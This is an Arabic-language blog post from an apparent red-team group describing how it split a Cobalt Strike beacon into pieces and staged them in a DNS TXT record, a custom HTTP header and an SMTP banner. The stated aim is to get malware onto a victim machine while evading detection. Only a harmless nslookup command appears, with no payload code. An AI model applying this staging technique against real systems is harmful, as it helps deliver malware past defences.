<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>
        Infiltrationar ::
        Confidential Team — UnKn0wn
      </title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta
  name="description"
  content="Introduction ألسلام عليكم  سمعنا كثير عن طرق تستخدم لنقل الملفات لجهاز الضحية ومعظم هذه الطرق صارة منتشرة الا درجة انها صارت سهلة الأكتشاف. في Confidential اتخذنا خطوة جديدة في نقل الملفات مما خلاها معقدة ليتم اكتشافها. رح تشوفون اليوم كيف قدرنا ننقل CS beacon عن طريق اكثر من medium.  Brief في البداية قسمنا ال CS beacon الى عدة قطع والي بعدين رح يتم نقلها عن طريق اكثر من medium (DNS TXT record, HTTP response header, and SMTP server&#39;s banner) وكل هذا يصير عن طريق برنامج خاص بالفريق وتقدرون تشوفون ال demo في النهاية."
/>
<meta
  name="keywords"
  content=""
/>
<meta name="robots" content="noodp" />
<link rel="canonical" href="/posts/infiltrationar/" />





<link rel="stylesheet" href="/assets/style.css" />

<link rel="stylesheet" href="/style.css" />


<link
  rel="apple-touch-icon-precomposed"
  sizes="144x144"
  href="/img/apple-touch-icon-144-precomposed.png"
/>
<link rel="shortcut icon" href="/img/favicon.png" />


<link href="/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Infiltrationar"/>
<meta name="twitter:description" content="Introduction ألسلام عليكم  سمعنا كثير عن طرق تستخدم لنقل الملفات لجهاز الضحية ومعظم هذه الطرق صارة منتشرة الا درجة انها صارت سهلة الأكتشاف. في Confidential اتخذنا خطوة جديدة في نقل الملفات مما خلاها معقدة ليتم اكتشافها. رح تشوفون اليوم كيف قدرنا ننقل CS beacon عن طريق اكثر من medium.  Brief في البداية قسمنا ال CS beacon الى عدة قطع والي بعدين رح يتم نقلها عن طريق اكثر من medium (DNS TXT record, HTTP response header, and SMTP server&#39;s banner) وكل هذا يصير عن طريق برنامج خاص بالفريق وتقدرون تشوفون ال demo في النهاية."/>



<meta property="og:title" content="Infiltrationar" />
<meta property="og:description" content="Introduction ألسلام عليكم  سمعنا كثير عن طرق تستخدم لنقل الملفات لجهاز الضحية ومعظم هذه الطرق صارة منتشرة الا درجة انها صارت سهلة الأكتشاف. في Confidential اتخذنا خطوة جديدة في نقل الملفات مما خلاها معقدة ليتم اكتشافها. رح تشوفون اليوم كيف قدرنا ننقل CS beacon عن طريق اكثر من medium.  Brief في البداية قسمنا ال CS beacon الى عدة قطع والي بعدين رح يتم نقلها عن طريق اكثر من medium (DNS TXT record, HTTP response header, and SMTP server&#39;s banner) وكل هذا يصير عن طريق برنامج خاص بالفريق وتقدرون تشوفون ال demo في النهاية." />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/infiltrationar/" />
<meta property="article:published_time" content="2022-01-03T16:57:00-05:00" />
<meta property="article:modified_time" content="2022-01-03T16:57:00-05:00" /><meta property="og:site_name" content="Confidential Team" />






  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a
  href="/"
  class="logo"
  style="text-decoration: none;"
>
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span>
    <span class="logo__text"
      >Confidential Team</span
    >
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about">About</a></li>
        
      
      
      
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about">About</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none" />
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg
  class="theme-toggler"
  width="24"
  height="24"
  viewBox="0 0 48 48"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
>
  <path
    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
  />
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <div class="post">
    <h1 class="post-title">Infiltrationar</h1>
    <div class="post-meta">
      
        <span class="post-date">
          2022-01-03
        </span>

        
          
        
      

      


      
        <span class="post-read-time"
          >— 2 min read</span
        >
      
    </div>

    

    

    <div class="post-content">
      
      <h2 id="introduction">Introduction</h2>
<DIV dir="rtl" align="right">
ألسلام عليكم
</DIV>
<DIV dir="rtl" align="right">
سمعنا كثير عن طرق تستخدم لنقل الملفات لجهاز الضحية ومعظم هذه الطرق صارة منتشرة الا درجة انها صارت سهلة الأكتشاف. في Confidential اتخذنا خطوة جديدة في نقل الملفات مما خلاها معقدة ليتم اكتشافها. رح تشوفون اليوم كيف قدرنا ننقل CS beacon عن طريق اكثر من medium. 
</DIV>
<h2 id="brief">Brief</h2>
<DIV dir="rtl" align="right">
في البداية قسمنا ال CS beacon الى عدة قطع والي بعدين رح يتم نقلها عن طريق اكثر من medium (DNS TXT record, HTTP response header, and SMTP server's banner) وكل هذا يصير عن طريق برنامج خاص بالفريق وتقدرون تشوفون ال demo في النهاية.
</DIV>
<h2 id="dns-txt-record">DNS txt record:</h2>
<DIV dir="rtl" align="right">
تعريف ال TXT record من Google:
</DIV>
<p>TXT records are a type of Domain Name System (DNS) record that contains text information.</p>
<DIV dir="rtl" align="right">
بأختصار نقدر نضيف وحدة من القطع المقسمة الخاصة ب CS beacon في TXT dns record في هذه الحالة اذا حاولنا نطلب هذه ال record رح ترجع لنا واحد من القطع
</DIV>
<pre><code>nslookup -querytype=txt confidential.example.com
</code></pre><p>![](nslookup output)</p>
<h2 id="http-response-header">HTTP Response Header:</h2>
<DIV dir="rtl" align="right">
عدلنا على اعدادات ال web server وظفنا header جديد اسمه Confidential يكون موجود في ال response ويحتوي على القطعة الثانية من ال CS Beacon
</DIV>
<p>![](HTTP Response Header output)</p>
<h2 id="smtp-servers-banner">SMTP Server&rsquo;s Banner:</h2>
<DIV dir="rtl" align="right">
عدلنا على اعدادات ال SMTP Server وظفنا اخر قطعة في ال banner
</DIV>
<p>Pic 3 ( SMTP Server&rsquo;s Banner output )</p>
<h2 id="demo">Demo</h2>
<p>Our team developed a tool that automates the process with more features. Here&rsquo;s a demo of the executable agent that we fired up inside the compromised windows machine.</p>
<h2 id="refrences">Refrences:</h2>
<ul>
<li><a href="https://support.google.com/a/answer/2716800?hl=en">https://support.google.com/a/answer/2716800?hl=en</a></li>
<li><a href="https://github.com/PaloAltoNetworks/research-notes/blob/master/notes/DNS-based%20data%20exfiltration%20and%20infiltration%20technology%20and%20detection.pdf">https://github.com/PaloAltoNetworks/research-notes/blob/master/notes/DNS-based%20data%20exfiltration%20and%20infiltration%20technology%20and%20detection.pdf</a></li>
</ul>

    </div>
    
      
        <div class="pagination">
          <div class="pagination__title">
            <span class="pagination__title-h"
              >Read other posts</span
            >
            <hr />
          </div>
          <div class="pagination__buttons">
            
            
              <span class="button next">
                <a href="/posts/infiltration/">
                  <span class="button__text">Infiltrating CS Beacon throughout different mediums</span>
                  <span class="button__icon">→</span>
                </a>
              </span>
            
          </div>
        </div>
      
    

    
      
        

      
    
  </div>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <a
  href="/"
  class="logo"
  style="text-decoration: none;"
>
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span>
    <span class="logo__text"
      >Confidential Team</span
    >
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        <span
          >© 2022 Powered by
          <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span
        >
        <span
          >Theme created by
          <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span
        >
      </div>
    
  </div>
</footer>

<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>


      
    </div>

    
  </body>
</html>
